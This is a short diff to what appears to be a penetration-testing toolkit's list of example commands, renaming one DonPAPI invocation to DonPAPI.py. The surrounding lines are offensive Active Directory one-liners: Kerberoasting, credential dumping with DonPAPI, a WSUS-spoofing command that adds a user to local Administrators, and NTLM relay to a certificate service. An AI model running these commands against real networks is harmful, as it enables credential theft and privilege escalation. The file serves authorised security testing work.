@@ -310,7 +310,7 @@ targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o Kerberoa
 pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
-DonPAPI breaking.bad/someadmin:somepassword@sometarget
+DonPAPI.py breaking.bad/someadmin:somepassword@sometarget
 webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@dc01.domain.local
 ntlmrelayx -t http://pki.domain.local/certsrv/certfnsh.asp --adcs
 echo '8.8.8.8' | hakrevdns
